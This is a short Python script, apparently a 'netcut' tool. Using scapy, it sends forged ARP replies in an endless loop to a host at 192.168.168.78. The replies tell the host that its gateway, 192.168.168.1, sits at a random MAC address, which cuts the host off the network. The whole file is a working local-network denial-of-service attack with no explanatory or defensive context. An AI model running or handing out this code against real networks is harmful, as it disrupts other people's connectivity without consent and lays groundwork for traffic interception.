from scapy.all import *
import os

cutIp="192.168.168.78"
cutMac=getmacbyip(cutIp)
gwIp="192.168.168.1"
gwMac=RandMAC()
netCut=ARP(op=2,hwsrc=gwMac,psrc=gwIp,hwdst=cutMac,pdst=cutIp)
#send(netCut,loop=1,inter=1)
sendp(Ether(dst=cutMac,src=gwMac)/netCut,loop=1,inter=1)
